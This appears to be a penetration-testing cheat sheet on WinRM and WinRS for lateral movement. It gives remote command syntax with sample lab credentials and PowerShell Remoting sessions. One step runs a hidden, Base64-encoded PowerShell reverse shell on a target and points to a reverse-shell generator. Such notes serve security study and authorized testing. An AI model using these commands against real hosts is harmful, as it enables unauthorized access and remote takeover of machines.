# WinRM (Windows Remote Management)
As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the [_WS-Management_](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

**Use Cases**: PowerShell Remoting, lateral movement, remote command execution.  
**Protocol**: HTTP/5985 (WinRM) or HTTPS/5986 (WinRM over SSL).  
**Note**: For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

---

### **1. Basic WinRS Usage**
```cmd
winrs -r:TARGET_HOST -u:USERNAME -p:PASSWORD "command"
```
**Flags:**  
- `-r:` Target hostname/IP  
- `-u:` Domain username (`domain\user` format if needed)  
- `-p:` Plaintext password  
- `-ssl` Use HTTPS (port 5986) instead of HTTP (5985)  

---

### **2. Command Execution Examples**
**Simple command:**  
```cmd
winrs -r:client9 -u:jen -p:Nexus123! "hostname"
# or with IP
winrs -r:192.168.139.70 -u:jen -p:Nexus123! "hostname"
```

**Multi-command execution:**  
```cmd
winrs -r:client9 -u:jen -p:Nexus123! "cmd /c hostname & whoami & ipconfig"
```

**Reverse shell (Base64 encoded PowerShell):**  
use **Encoded** shell from [PowerShell_RCE](https://github.com/MGamalCYSEC/ReverseShellCrafter/tree/main/PowerShell)
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

---

### **3. PowerShell Remoting (WinRM)**
**Create PSCredential object:**  
```powershell
$cred = New-Object System.Management.Automation.PSCredential('jen', (ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
```

**New session:**  
```powershell
$session = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
```

**Enter session:**  
```powershell
Enter-PSSession -Session $session
```

**Run command remotely:**  
```powershell
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
```

---

### **5. Troubleshooting**
**Verify WinRM is running:**  
```cmd
winrm enumerate winrm/config/listener
```

**Check firewall rules:**  
```cmd
netsh advfirewall firewall show rule name=all | findstr "5985 5986"
```

**Test connectivity:**  
```powershell
Test-WSMan -ComputerName TARGET_IP
```

---

### **6. Key Requirements**
1. Target must have WinRM enabled (`Enable-PSRemoting`)  
2. User must be in:  
   - **Remote Management Users** group (basic access)  
   - **Administrators** group (full privileges)  
3. Ports open: 5985 (HTTP) / 5986 (HTTPS)

   

